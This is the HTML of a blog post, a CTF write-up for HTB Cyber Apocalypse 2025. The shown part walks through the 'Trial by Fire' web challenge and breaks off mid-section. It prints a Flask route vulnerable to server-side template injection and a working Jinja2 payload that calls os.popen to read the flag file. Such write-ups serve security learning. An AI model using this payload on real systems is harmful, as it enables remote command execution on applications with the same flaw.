@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="rPvUCgYTOPryg6QXUsRcNaqgw7cfzujZZyi0ipJPLdM" />
+        <meta name="robots" content="noodp" />
+        <title>HTB Cyber Apocalypse 2025 Writeup - whyuhurtz&#39;s Blog</title><meta name="Description" content="I managed to solved 4 challenges, which are web exploit and rev."><meta property="og:url" content="https://whyuhurtz.me/2025/03/htb-cyber-apocalypse-2025-writeup/">
+  <meta property="og:site_name" content="whyuhurtz&#39;s Blog">
+  <meta property="og:title" content="HTB Cyber Apocalypse 2025 Writeup">
+  <meta property="og:description" content="I managed to solved 4 challenges, which are web exploit and rev.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-27T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="International">
+    <meta property="article:tag" content="Web Exploit">
+    <meta property="article:tag" content="Reverse">
+    <meta property="article:tag" content="Pwn">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB Cyber Apocalypse 2025 Writeup">
+  <meta name="twitter:description" content="I managed to solved 4 challenges, which are web exploit and rev.">
+<meta name="application-name" content="whyuhurtz&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="whyuhurtz&#39;s Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://whyuhurtz.me/2025/03/htb-cyber-apocalypse-2025-writeup/" /><link rel="prev" href="https://whyuhurtz.me/2025/03/pearl-ctf-2025-writeup/" /><link rel="next" href="https://whyuhurtz.me/2025/06/install-ubuntu-gnome-from-scratch-using-debootstrap/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HTB Cyber Apocalypse 2025 Writeup",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/whyuhurtz.me\/2025\/03\/htb-cyber-apocalypse-2025-writeup\/"
+        },"genre": "posts","keywords": "ctf, international, web exploit, reverse, pwn","wordcount":  3810 ,
+        "url": "https:\/\/whyuhurtz.me\/2025\/03\/htb-cyber-apocalypse-2025-writeup\/","datePublished": "2025-03-27T00:00:00+00:00","dateModified": "2025-03-27T00:00:00+00:00","license": "\u0026copy; 2023-2025","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "whyuhurtz"
+            },"description": "I managed to solved 4 challenges, which are web exploit and rev."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/achievements/"> Achievements </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/achievements/" title="">Achievements</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Cyber Apocalypse 2025 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/whyuhurtz" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>whyuhurtz</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-27">2025-03-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3810 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;18 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#1-trial-by-fire">1. Trial by Fire</a>
+          <ul>
+            <li><a href="#description">Description</a></li>
+            <li><a href="#required-knowledge">Required Knowledge</a></li>
+            <li><a href="#solve-walkthrough">Solve Walkthrough</a></li>
+            <li><a href="#flag">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-whispers-of-the-moonbeam">2. Whispers of the Moonbeam</a>
+          <ul>
+            <li><a href="#description-1">Description</a></li>
+            <li><a href="#required-knowledge-1">Required Knowledge</a></li>
+            <li><a href="#solve-walkthrough-1">Solve Walkthrough</a></li>
+            <li><a href="#flag-1">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#1-ecryptedscroll">1. EcryptedScroll</a>
+          <ul>
+            <li><a href="#description-2">Description</a></li>
+            <li><a href="#required-knowledge-2">Required Knowledge</a></li>
+            <li><a href="#solve-walkthrough-2">Solve Walkthrough</a></li>
+            <li><a href="#3-decrypt-the-secret-message">3. Decrypt The Secret Message</a></li>
+            <li><a href="#flag-2">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-sealedrune">2. SealedRune</a>
+          <ul>
+            <li><a href="#description-3">Description</a></li>
+            <li><a href="#required-knowledge-3">Required Knowledge</a></li>
+            <li><a href="#solve-walkthrough-3">Solve Walkthrough</a></li>
+            <li><a href="#flag-3">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#quack-quack-upsolved-after-ended">Quack Quack (Upsolved After Ended)</a>
+          <ul>
+            <li><a href="#description-4">Description</a></li>
+            <li><a href="#required-knowledge-4">Required Knowledge</a></li>
+            <li><a href="#solve-walkthrough-4">Solve Walkthrough</a></li>
+            <li><a href="#flag-4">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content">I managed to solved 4 challenges, which are web exploit and rev.
+<h1 id="web">Web</h1>
+<h2 id="1-trial-by-fire">1. Trial by Fire</h2>
+<h3 id="description">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.</div>
+        </div>
+    </div>
+<h3 id="required-knowledge">Required Knowledge</h3>
+<ul>
+<li>Server Side Template Injection (SSTI)</li>
+<li>Docker Container</li>
+</ul>
+<h3 id="solve-walkthrough">Solve Walkthrough</h3>
+<p>The flag file location is not changed to root directory or somewhere else, it inside the app challenge directory. Basically, this logic behind the app is to play a game. The objective of the game is to <strong>defeat a dragon</strong> that have health <strong>1337</strong>. But, we can&rsquo;t defeat the dragon in a regular way, we&rsquo;ve to find a vulnerability to defeat the dragon or at least to get the flag (not matter we win or not). So, I played this game a little bit after that I realize something that can be a vulnerability. Take a look at the image below.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_web1-01.png"
+        data-srcset="/images/htb-cyber-apocalypse_web1-01.png, /images/htb-cyber-apocalypse_web1-01.png 1.5x, /images/htb-cyber-apocalypse_web1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_web1-01.png"
+        title="Trial by Fire-01" width="646" height="641" /></p>
+<p>Why it can be a vulnerability? As simple as I can manipulate the win/lose condition at there. See the route or logic behind the <code>/battle-report</code> url below.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># filename: routes.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@web.route</span><span class="p">(</span><span class="s1">&#39;/battle-report&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">battle_report</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">warrior_name</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;warrior_name&#34;</span><span class="p">,</span> <span class="s2">&#34;Unknown Warrior&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">battle_duration</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;battle_duration&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">stats</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;damage_dealt&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;damage_dealt&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;damage_taken&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;damage_taken&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;spells_cast&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;spells_cast&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;turns_survived&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;turns_survived&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;outcome&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;outcome&#39;</span><span class="p">,</span> <span class="s1">&#39;defeat&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">REPORT_TEMPLATE</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;html&gt;SSTI
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;title&gt;Battle Report - The Flame Peaks&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;/static/images/favicon.png&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;link href=&#34;&lt;https://unpkg.com/nes.css@latest/css/nes.min.css&gt;&#34; rel=&#34;stylesheet&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;nes-container with-title is-dark battle-report&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;p class=&#34;title&#34;&gt;Battle Report&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;div class=&#34;warrior-info&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;i class=&#34;nes-icon is-large heart&#34;&gt;&lt;/i&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;p class=&#34;nes-text is-primary warrior-name&#34;&gt;</span><span class="si">{</span><span class="n">warrior_name</span><span class="si">}</span><span class="s2">&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;div class=&#34;report-stats&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;div class=&#34;nes-container is-dark with-title stat-group&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;p class=&#34;title&#34;&gt;Battle Statistics&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;p&gt;🗡️ Damage Dealt: &lt;span class=&#34;nes-text is-success&#34;&gt;</span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;damage_dealt&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/span&gt;&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;p&gt;💔 Damage Taken: &lt;span class=&#34;nes-text is-error&#34;&gt;</span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;damage_taken&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/span&gt;&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;p&gt;✨ Spells Cast: &lt;span class=&#34;nes-text is-warning&#34;&gt;</span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;spells_cast&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/span&gt;&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;p&gt;⏱️ Turns Survived: &lt;span class=&#34;nes-text is-primary&#34;&gt;</span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;turns_survived&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/span&gt;&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;p&gt;⚔️ Battle Duration: &lt;span class=&#34;nes-text is-secondary&#34;&gt;</span><span class="si">{</span><span class="nb">float</span><span class="p">(</span><span class="n">battle_duration</span><span class="p">)</span><span class="si">:</span><span class="s2">.1f</span><span class="si">}</span><span class="s2"> seconds&lt;/span&gt;&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;div class=&#34;nes-container is-dark battle-outcome </span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;outcome&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;h2 class=&#34;nes-text is-primary&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        </span><span class="si">{</span><span class="s2">&#34;🏆 Glorious Victory!&#34;</span> <span class="k">if</span> <span class="n">stats</span><span class="p">[</span><span class="s1">&#39;outcome&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;victory&#34;</span> <span class="k">else</span> <span class="s2">&#34;💀 Valiant Defeat&#34;</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;p class=&#34;nes-text&#34;&gt;</span><span class="si">{</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">DRAGON_TAUNTS</span><span class="p">)</span><span class="si">}</span><span class="s2">&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;div class=&#34;report-actions nes-container is-dark&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;a href=&#34;/flamedrake&#34; class=&#34;nes-btn is-primary&#34;&gt;⚔️ Challenge Again&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;a href=&#34;/&#34; class=&#34;nes-btn is-error&#34;&gt;🏰 Return to Entrance&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">REPORT_TEMPLATE</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>Notice that <strong>only POST request is accepted</strong>, so be careful when you intercept the request. The <code>stats</code> array contains <strong>un-sanitized user input</strong> and the function is return a <code>render_template_string</code> that can cause a SSTI vulnerability. But, how we can manipulate the POST request ? <strong>Play a little bit and when you lose, you can intercept using burp suite</strong>.</p>
+<p>Here&rsquo;s the POC when I read the flag. Basically, this payload is to import the <code>os</code> and use <code>popen</code> to cat the <code>flag.txt</code> .</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">damage_dealt</span><span class="o">=</span><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat+flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">damage_taken</span><span class="o">=</span><span class="mi">100</span><span class="o">&amp;</span><span class="n">spells_cast</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">turns_survived</span><span class="o">=</span><span class="mi">3</span><span class="o">&amp;</span><span class="n">outcome</span><span class="o">=</span><span class="n">defeat</span><span class="o">&amp;</span><span class="n">battle_duration</span><span class="o">=</span><span class="mf">18.116</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_web1-02.png"
+        data-srcset="/images/htb-cyber-apocalypse_web1-02.png, /images/htb-cyber-apocalypse_web1-02.png 1.5x, /images/htb-cyber-apocalypse_web1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_web1-02.png"
+        title="Trial by Fire-02" width="1109" height="459" /></p>
+<p>Okay, now let&rsquo;s manipulate the POST request to <code>/battle-report</code> in the remote target. Here&rsquo;s the POC:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_web1-03.png"
+        data-srcset="/images/htb-cyber-apocalypse_web1-03.png, /images/htb-cyber-apocalypse_web1-03.png 1.5x, /images/htb-cyber-apocalypse_web1-03.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_web1-03.png"
+        title="Trial by Fire-03" /></p>
+<p>Actually, you can see the SSTI vulnerability directly in the given source code, specifically in the <code>/challenges/application/templates/index.html</code> . As the result, in the index page, it will show <code>49</code> that multiplied value of <code>7*7</code> .</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- index.html --&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;home-container nes-container is-rounded&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nes-text is-error&#34;</span><span class="p">&gt;</span>Welcome to the Flame Peaks<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nes-text&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      In a land of burning rivers and searing heat, the Fire Drake stands guard over the Emberstone. Many have sought its power; none have prevailed.
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      Legends speak of ancient template scrolls—arcane writings that twist fate when exploited. Hidden symbols may change everything.
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      Can you read the runes? Perhaps {{ 7 * 7 }} is the key. <span class="c">&lt;!-- SSTI --&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/begin&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;warrior-form nes-container is-rounded&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;warrior_name&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nes-text is-error&#34;</span><span class="p">&gt;</span>What is your name, brave warrior?<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;warrior_name&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;warrior_name&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nes-input&#34;</span> <span class="na">required</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Enter your name...&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;30&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;background-color: rgba(17, 24, 39, 0.95);&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nes-btn is-error challenge-button&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        ⚔️ Challenge the Fire Drake
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p>You can notice in the opening of the website.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_web1-04.png"
+        data-srcset="/images/htb-cyber-apocalypse_web1-04.png, /images/htb-cyber-apocalypse_web1-04.png 1.5x, /images/htb-cyber-apocalypse_web1-04.png 2x"
